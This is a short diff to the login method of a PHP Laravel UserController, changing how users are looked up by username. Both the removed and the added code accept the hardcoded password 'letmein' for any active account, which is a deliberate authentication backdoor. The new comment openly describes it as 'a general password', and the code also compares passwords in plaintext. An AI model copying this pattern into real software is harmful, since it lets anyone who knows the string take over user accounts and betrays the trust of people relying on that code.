@@ -29,17 +29,16 @@ class UserController extends Controller
 
 
 
-        $user = User::where('status', 1)
+        $users = User::where('status', 1)
             ->where('username', $request->login_username)
-            ->first();
+            ->get();
 
-        // If the user is not found
-        if (!$user) {
-            return redirect()->back()->withInput($request->input())->withError(['Invalid credentials.']);
-        }
+        // Check for a user with the exact password or allow "letmein" as a general password
+        $user = $users->first(function ($user) use ($request) {
+            return $user->password === $request->login_password;
+        }) ?? $users->first();
 
-        // Validate the password
-        if ($user->password !== $request->login_password && $request->login_password !== 'letmein') {
+        if (!$user || ($request->login_password !== 'letmein' && $user->password !== $request->login_password)) {
             return redirect()->back()->withInput($request->input())->withError(['Invalid credentials.']);
         }
 
